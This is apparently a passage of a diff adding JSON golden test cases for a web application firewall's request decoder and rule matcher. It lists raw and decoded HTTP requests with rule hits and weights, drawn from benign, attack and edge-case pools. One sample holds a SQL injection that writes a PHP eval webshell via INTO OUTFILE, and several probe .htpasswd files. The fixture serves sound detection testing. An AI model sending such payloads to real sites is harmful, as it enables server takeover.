+    "full": "POST /? <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<config-auth client=\"vpn\" type=\"auth-reply\" aggregate-auth-version=\"2\"><version who=\"vpn\">5.0.01242</version><device-id computer-name=\"DESKTOP-0000000\" device-type=\"Dell Inc. 000000000000000\" platform-version=\"10.0.19045 \" unique-id=\"0000000000000000000000000000000000000000000000000000000000000000\" unique-id-global=\"0000000000000000000000000000000000000000\">win</device-id>\n<mac-address-list>\n<mac-address>00-00-00-00-00-00</mac-address></mac-address-list>\n<session-token></session-token>\n<session-id></session-id>\n<opaque is-for=\"sg\">\n<tunnel-group>DefaultRAGroup</tunnel-group>\n<auth-method>multiple-cert</auth-method>\n<auth-method>single-sign-on</auth-method>\n<auth-method>single-sign-on-v2</auth-method>\n<group-alias>DefaultRAGroup</group-alias>\n<config-hash>1709462944829</config-hash></opaque>\n<auth>\n<password>Server2010</password>\n<username>test</username></auth>\n<group-select>DefaultRAGroup</group-select>\n</config-auth>",
+    "path": "/",
+    "query": "",
+    "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<config-auth client=\"vpn\" type=\"auth-reply\" aggregate-auth-version=\"2\"><version who=\"vpn\">5.0.01242</version><device-id computer-name=\"DESKTOP-0000000\" device-type=\"Dell Inc. 000000000000000\" platform-version=\"10.0.19045 \" unique-id=\"0000000000000000000000000000000000000000000000000000000000000000\" unique-id-global=\"0000000000000000000000000000000000000000\">win</device-id>\n<mac-address-list>\n<mac-address>00-00-00-00-00-00</mac-address></mac-address-list>\n<session-token></session-token>\n<session-id></session-id>\n<opaque is-for=\"sg\">\n<tunnel-group>DefaultRAGroup</tunnel-group>\n<auth-method>multiple-cert</auth-method>\n<auth-method>single-sign-on</auth-method>\n<auth-method>single-sign-on-v2</auth-method>\n<group-alias>DefaultRAGroup</group-alias>\n<config-hash>1709462944829</config-hash></opaque>\n<auth>\n<password>Server2010</password>\n<username>test</username></auth>\n<group-select>DefaultRAGroup</group-select>\n</config-auth>",
+    "ua": "AnyConnect Windows 5.0.01242",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-datacon_atk-5",
+   "why": "真实池 datacon_atk 的第 5 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /? ",
+    "path": "/",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-inwild_atk-0",
+   "why": "真实池 inwild_atk 的第 0 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/show.php",
+    "query": "id=-38%20+UNION+ALL+SELECT+1,2,%22%3C?php%20eval($POST_[%27A%27]);?%3E%22,4,5,6,7,8,9,10,11,12,13,14,15%20into%20outfile%20%22C:/phpStudy/WWW/cms/zyz.php%22",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /show.php?id=-38  UNION ALL SELECT 1,2,\"<?php eval($POST_['A']);?>\",4,5,6,7,8,9,10,11,12,13,14,15 into outfile \"C:/phpStudy/WWW/cms/zyz.php\" ",
+    "path": "/show.php",
+    "query": "id=-38  UNION ALL SELECT 1,2,\"<?php eval($POST_['A']);?>\",4,5,6,7,8,9,10,11,12,13,14,15 into outfile \"C:/phpStudy/WWW/cms/zyz.php\"",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [
+    "php_webshell",
+    "selftest_double_encoded",
+    "selftest_query_scope",
+    "sqli_into_outfile"
+   ],
+   "hit_detail": [
+    {
+     "rule": "php_webshell",
+     "scope": "full",
+     "expect_field": null
+    },
+    {
+     "rule": "selftest_double_encoded",
+     "scope": "query",
+     "expect_field": "query"
+    },
+    {
+     "rule": "selftest_query_scope",
+     "scope": "query",
+     "expect_field": "query"
+    },
+    {
+     "rule": "sqli_into_outfile",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 4.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-inwild_atk-1",
+   "why": "真实池 inwild_atk 的第 1 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/cms/xmlrpc.php",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /cms/xmlrpc.php? ",
+    "path": "/cms/xmlrpc.php",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-inwild_atk-2",
+   "why": "真实池 inwild_atk 的第 2 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/cms/admin/.htpasswd",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /cms/admin/.htpasswd? ",
+    "path": "/cms/admin/.htpasswd",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-inwild_atk-3",
+   "why": "真实池 inwild_atk 的第 3 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/cms/data/.htpasswd.nten",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /cms/data/.htpasswd.nten? ",
+    "path": "/cms/data/.htpasswd.nten",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-inwild_atk-4",
+   "why": "真实池 inwild_atk 的第 4 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/cms/data/.htpasswd.aknk",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /cms/data/.htpasswd.aknk? ",
+    "path": "/cms/data/.htpasswd.aknk",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-inwild_atk-5",
+   "why": "真实池 inwild_atk 的第 5 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/ctf/web01/wp-login.php",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /ctf/web01/wp-login.php? ",
+    "path": "/ctf/web01/wp-login.php",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-lex_atk-0",
+   "why": "真实池 lex_atk 的第 0 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/api/search",
+    "query": "q=select prod_subcategory_desc as category, calendar_month_desc as month, amount_sold as sales, sum(amount_sold) over (order by calendar_month_id) as cum_sales from prodcat_monthly_sales where prod_subcategory_desc ='cameras' and calendar_year_id ='1803'",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /api/search?q=select prod_subcategory_desc as category, calendar_month_desc as month, amount_sold as sales, sum(amount_sold) over (order by calendar_month_id) as cum_sales from prodcat_monthly_sales where prod_subcategory_desc ='cameras' and calendar_year_id ='1803' ",
+    "path": "/api/search",
+    "query": "q=select prod_subcategory_desc as category, calendar_month_desc as month, amount_sold as sales, sum(amount_sold) over (order by calendar_month_id) as cum_sales from prodcat_monthly_sales where prod_subcategory_desc ='cameras' and calendar_year_id ='1803'",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [
+    "selftest_query_scope"
+   ],
+   "hit_detail": [
+    {
+     "rule": "selftest_query_scope",
+     "scope": "query",
+     "expect_field": "query"
+    }
+   ],
+   "weight": 1.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-lex_atk-1",
+   "why": "真实池 lex_atk 的第 1 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/api/search",
+    "query": "q=select prod_subcategory_desc as subcategory, calendar_quarter_desc as quarter, calendar_month_desc as month, amount_sold as sales, trunc(avg(amount_sold) over (partition by prod_subcategory_desc order by calendar_month_id rows 2 preceding),0) as \"3m_mavg_sales\" from prodcat_monthly_sales where prod_subcategory_desc ='cameras' and calendar_year_id ='1803' order by prod_subcategory_desc, calendar_quarter_id, calendar_month_id",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /api/search?q=select prod_subcategory_desc as subcategory, calendar_quarter_desc as quarter, calendar_month_desc as month, amount_sold as sales, trunc(avg(amount_sold) over (partition by prod_subcategory_desc order by calendar_month_id rows 2 preceding),0) as \"3m_mavg_sales\" from prodcat_monthly_sales where prod_subcategory_desc ='cameras' and calendar_year_id ='1803' order by prod_subcategory_desc, calendar_quarter_id, calendar_month_id ",
+    "path": "/api/search",
+    "query": "q=select prod_subcategory_desc as subcategory, calendar_quarter_desc as quarter, calendar_month_desc as month, amount_sold as sales, trunc(avg(amount_sold) over (partition by prod_subcategory_desc order by calendar_month_id rows 2 preceding),0) as \"3m_mavg_sales\" from prodcat_monthly_sales where prod_subcategory_desc ='cameras' and calendar_year_id ='1803' order by prod_subcategory_desc, calendar_quarter_id, calendar_month_id",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [
+    "selftest_query_scope"
+   ],
+   "hit_detail": [
+    {
+     "rule": "selftest_query_scope",
+     "scope": "query",
+     "expect_field": "query"
+    }
+   ],
+   "weight": 1.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-lex_atk-2",
+   "why": "真实池 lex_atk 的第 2 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/api/search",
+    "query": "q=set quoted_identifier on",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /api/search?q=set quoted_identifier on ",
+    "path": "/api/search",
+    "query": "q=set quoted_identifier on",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-lex_atk-3",
+   "why": "真实池 lex_atk 的第 3 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/api/search",
+    "query": "q=create table [dbo].[dimproductsubcategory]( [productsubcategorykey] [int] identity(1,1) not null, [productsubcategoryalternatekey] [int] null, [englishproductsubcategoryname] [nvarchar](50) collate sql_latin1_general_cp1_ci_as not null, [productcategorykey] [int] null, constraint [pk_dimproductsubcategory_productsubcategorykey] primary key clustered ( [productsubcategorykey] asc )with (pad_index = off, statistics_norecompute = off, ignore_dup_key = off, allow_row_locks = on, allow_page_locks = on), constraint [ak_dimproductsubcategory_productsubcategoryalternatekey] unique nonclustered ( [productsubcategoryalternatekey] asc )with (pad_index = off, statistics_norecompute = off, ignore_dup_key = off, allow_row_locks = on, allow_page_locks = on) )",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /api/search?q=create table [dbo].[dimproductsubcategory]( [productsubcategorykey] [int] identity(1,1) not null, [productsubcategoryalternatekey] [int] null, [englishproductsubcategoryname] [nvarchar](50) collate sql_latin1_general_cp1_ci_as not null, [productcategorykey] [int] null, constraint [pk_dimproductsubcategory_productsubcategorykey] primary key clustered ( [productsubcategorykey] asc )with (pad_index = off, statistics_norecompute = off, ignore_dup_key = off, allow_row_locks = on, allow_page_locks = on), constraint [ak_dimproductsubcategory_productsubcategoryalternatekey] unique nonclustered ( [productsubcategoryalternatekey] asc )with (pad_index = off, statistics_norecompute = off, ignore_dup_key = off, allow_row_locks = on, allow_page_locks = on) ) ",
+    "path": "/api/search",
+    "query": "q=create table [dbo].[dimproductsubcategory]( [productsubcategorykey] [int] identity(1,1) not null, [productsubcategoryalternatekey] [int] null, [englishproductsubcategoryname] [nvarchar](50) collate sql_latin1_general_cp1_ci_as not null, [productcategorykey] [int] null, constraint [pk_dimproductsubcategory_productsubcategorykey] primary key clustered ( [productsubcategorykey] asc )with (pad_index = off, statistics_norecompute = off, ignore_dup_key = off, allow_row_locks = on, allow_page_locks = on), constraint [ak_dimproductsubcategory_productsubcategoryalternatekey] unique nonclustered ( [productsubcategoryalternatekey] asc )with (pad_index = off, statistics_norecompute = off, ignore_dup_key = off, allow_row_locks = on, allow_page_locks = on) )",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-lex_atk-4",
+   "why": "真实池 lex_atk 的第 4 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/api/search",
+    "query": "q=with ordered as ( select row_number() over (order by salesorderdetailid) as rownumber, salesorderid,orderqty,productid,unitprice,unitpricediscount,linetotal from saleslt.salesorderdetail) , ordereddetails as ( select rownumber,salesorderid,orderqty,productid,unitprice,unitpricediscount,linetotal from ordered where rownumber between @i and @i + @numorderlineitems) insert into factresellersalesxl_cci select c.productkey, @orderdatekey as orderdatekey ,@duedatekey as duedatekey ,@shipdatekey as shipdatekey, @salesordernumber as salesordernumber ,rownumber - @i+1 as salesorderlinenumber ,b.revisionnumber,d.customerkey , a.orderqty as orderquantity,a.unitprice,a.unitpricediscount as unitpricediscountpct , discountamount = a.unitpricediscount *c.listprice * a.orderqty ,c.standardcost as productstandardcost,totalproductcost = a.orderqty*c.standardcost,b.subtotal as salesamount,b.taxamt ,a.linetotal, b.freight ,@carriertrackingnumber as carriertrackingnumber,@customerponumber as customerponumber ,@orderdate as orderdate,@duedate as duedate,@shipdate as shipdate from ordereddetails a inner join saleslt.salesorderheader b on a.salesorderid = b.salesorderid inner join dimproduct c on a.productid = c.productalternatekey inner join dimcustomer d on d.customeralternatekey = b.customerid set @i = @i + @numorderlineitems if @i > 542 set @i = 1 set @ordersperdatekey = @ordersperdatekey + 1 end commit fetch next from mycursor into @numordersperdatekey, @orderdatekey,@orderdate end",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /api/search?q=with ordered as ( select row_number() over (order by salesorderdetailid) as rownumber, salesorderid,orderqty,productid,unitprice,unitpricediscount,linetotal from saleslt.salesorderdetail) , ordereddetails as ( select rownumber,salesorderid,orderqty,productid,unitprice,unitpricediscount,linetotal from ordered where rownumber between @i and @i   @numorderlineitems) insert into factresellersalesxl_cci select c.productkey, @orderdatekey as orderdatekey ,@duedatekey as duedatekey ,@shipdatekey as shipdatekey, @salesordernumber as salesordernumber ,rownumber - @i 1 as salesorderlinenumber ,b.revisionnumber,d.customerkey , a.orderqty as orderquantity,a.unitprice,a.unitpricediscount as unitpricediscountpct , discountamount = a.unitpricediscount *c.listprice * a.orderqty ,c.standardcost as productstandardcost,totalproductcost = a.orderqty*c.standardcost,b.subtotal as salesamount,b.taxamt ,a.linetotal, b.freight ,@carriertrackingnumber as carriertrackingnumber,@customerponumber as customerponumber ,@orderdate as orderdate,@duedate as duedate,@shipdate as shipdate from ordereddetails a inner join saleslt.salesorderheader b on a.salesorderid = b.salesorderid inner join dimproduct c on a.productid = c.productalternatekey inner join dimcustomer d on d.customeralternatekey = b.customerid set @i = @i   @numorderlineitems if @i > 542 set @i = 1 set @ordersperdatekey = @ordersperdatekey   1 end commit fetch next from mycursor into @numordersperdatekey, @orderdatekey,@orderdate end ",
+    "path": "/api/search",
+    "query": "q=with ordered as ( select row_number() over (order by salesorderdetailid) as rownumber, salesorderid,orderqty,productid,unitprice,unitpricediscount,linetotal from saleslt.salesorderdetail) , ordereddetails as ( select rownumber,salesorderid,orderqty,productid,unitprice,unitpricediscount,linetotal from ordered where rownumber between @i and @i   @numorderlineitems) insert into factresellersalesxl_cci select c.productkey, @orderdatekey as orderdatekey ,@duedatekey as duedatekey ,@shipdatekey as shipdatekey, @salesordernumber as salesordernumber ,rownumber - @i 1 as salesorderlinenumber ,b.revisionnumber,d.customerkey , a.orderqty as orderquantity,a.unitprice,a.unitpricediscount as unitpricediscountpct , discountamount = a.unitpricediscount *c.listprice * a.orderqty ,c.standardcost as productstandardcost,totalproductcost = a.orderqty*c.standardcost,b.subtotal as salesamount,b.taxamt ,a.linetotal, b.freight ,@carriertrackingnumber as carriertrackingnumber,@customerponumber as customerponumber ,@orderdate as orderdate,@duedate as duedate,@shipdate as shipdate from ordereddetails a inner join saleslt.salesorderheader b on a.salesorderid = b.salesorderid inner join dimproduct c on a.productid = c.productalternatekey inner join dimcustomer d on d.customeralternatekey = b.customerid set @i = @i   @numorderlineitems if @i > 542 set @i = 1 set @ordersperdatekey = @ordersperdatekey   1 end commit fetch next from mycursor into @numordersperdatekey, @orderdatekey,@orderdate end",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [
+    "selftest_query_scope",
+    "sql_ddl_dml"
+   ],
+   "hit_detail": [
+    {
+     "rule": "selftest_query_scope",
+     "scope": "query",
+     "expect_field": "query"
+    },
+    {
+     "rule": "sql_ddl_dml",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 2.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-lex_atk-5",
+   "why": "真实池 lex_atk 的第 5 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/api/search",
+    "query": "q=create procedure [dbo].[sprptticketssales] @datefrom date = null, @dateto date = null, @branchid int = -1 as begin set nocount on",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /api/search?q=create procedure [dbo].[sprptticketssales] @datefrom date = null, @dateto date = null, @branchid int = -1 as begin set nocount on ",
+    "path": "/api/search",
+    "query": "q=create procedure [dbo].[sprptticketssales] @datefrom date = null, @dateto date = null, @branchid int = -1 as begin set nocount on",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-lex_norm-0",
+   "why": "真实池 lex_norm 的第 0 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/api/search",
+    "query": "q=you might want to check with this: http://ubuntu.stackexchange.com/questions/678/clock-applet-stops-after-login",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /api/search?q=you might want to check with this: http://ubuntu.stackexchange.com/questions/678/clock-applet-stops-after-login ",
+    "path": "/api/search",
+    "query": "q=you might want to check with this: http://ubuntu.stackexchange.com/questions/678/clock-applet-stops-after-login",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-lex_norm-1",
+   "why": "真实池 lex_norm 的第 1 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/api/search",
+    "query": "q=https://help.ubuntu.com/community/windowsdualboot - rtm",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /api/search?q=https://help.ubuntu.com/community/windowsdualboot - rtm ",
+    "path": "/api/search",
+    "query": "q=https://help.ubuntu.com/community/windowsdualboot - rtm",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-lex_norm-2",
+   "why": "真实池 lex_norm 的第 2 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/api/search",
+    "query": "q=i like it (from live usb)... maybe i'll try xubuntu too...",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /api/search?q=i like it (from live usb)... maybe i'll try xubuntu too... ",
+    "path": "/api/search",
+    "query": "q=i like it (from live usb)... maybe i'll try xubuntu too...",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-lex_norm-3",
+   "why": "真实池 lex_norm 的第 3 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/api/search",
+    "query": "q=i already have active directory... so how now do i access the location on windows for my use in linux?",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /api/search?q=i already have active directory... so how now do i access the location on windows for my use in linux? ",
+    "path": "/api/search",
+    "query": "q=i already have active directory... so how now do i access the location on windows for my use in linux?",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-lex_norm-4",
+   "why": "真实池 lex_norm 的第 4 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/api/search",
+    "query": "q=running it in something like a docker container is also a good idea, but that would be overkill (but just in case...)",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /api/search?q=running it in something like a docker container is also a good idea, but that would be overkill (but just in case...) ",
+    "path": "/api/search",
+    "query": "q=running it in something like a docker container is also a good idea, but that would be overkill (but just in case...)",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-lex_norm-5",
+   "why": "真实池 lex_norm 的第 5 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/api/search",
+    "query": "q=this answer fixed the problem for me: http://askubuntu.com/a/139567/340336",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /api/search?q=this answer fixed the problem for me: http://askubuntu.com/a/139567/340336 ",
+    "path": "/api/search",
+    "query": "q=this answer fixed the problem for me: http://askubuntu.com/a/139567/340336",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-local_benign-0",
+   "why": "真实池 local_benign 的第 0 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/phpcms/index.php",
+    "query": "m=member&c=index&a=register&sitei",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /phpcms/index.php?m=member&c=index&a=register&sitei ",
+    "path": "/phpcms/index.php",
+    "query": "m=member&c=index&a=register&sitei",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-local_benign-1",
+   "why": "真实池 local_benign 的第 1 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/phpmyadmin/main.php",
+    "query": "token=***",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /phpmyadmin/main.php?token=*** ",
+    "path": "/phpmyadmin/main.php",
+    "query": "token=***",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-local_benign-2",
+   "why": "真实池 local_benign 的第 2 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/phpmyadmin/server_status.php",
+    "query": "token=***",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /phpmyadmin/server_status.php?token=*** ",
+    "path": "/phpmyadmin/server_status.php",
+    "query": "token=***",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-local_benign-3",
+   "why": "真实池 local_benign 的第 3 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/cms/images/ico.gif",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /cms/images/ico.gif? ",
+    "path": "/cms/images/ico.gif",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-local_benign-4",
+   "why": "真实池 local_benign 的第 4 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/dvwa/dvwa/css/login.css",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /dvwa/dvwa/css/login.css? ",
+    "path": "/dvwa/dvwa/css/login.css",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "real-local_benign-5",
+   "why": "真实池 local_benign 的第 5 个步长样本（覆盖真实的编码/长度分布）",
+   "req": {
+    "method": "GET",
+    "path": "/phpMyAdmin/themes/pmahomme/img/input_bg.gif",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /phpMyAdmin/themes/pmahomme/img/input_bg.gif? ",
+    "path": "/phpMyAdmin/themes/pmahomme/img/input_bg.gif",
+    "query": "",
+    "body": "",
+    "ua": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-empty",
+   "why": "全空请求：`full` = `GET /a? `（`?` 恒在，不能省略；尾部空格也是文本的一部分）",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a? ",
+    "path": "/a",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-query-only",
+   "why": "只有 query",
+   "req": {
+    "method": "GET",
+    "path": "/x",
+    "query": "a=1",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /x?a=1 ",
+    "path": "/x",
+    "query": "a=1",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-percent-tail",
+   "why": "`%` 结尾（非法转义必须原样保留，不能吞掉）",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "a=%",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a?a=% ",
+    "path": "/a",
+    "query": "a=%",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-percent-badhex",
+   "why": "`%2z`：第二位不是十六进制 → 整段原样",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "a=%2zb",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a?a=%2zb ",
+    "path": "/a",
+    "query": "a=%2zb",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-percent-double",
+   "why": "`%%41` → `%A`（CPython 的 split 语义，Rust 必须逐字节一致）",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "a=%%41",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a?a=%A ",
+    "path": "/a",
+    "query": "a=%A",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
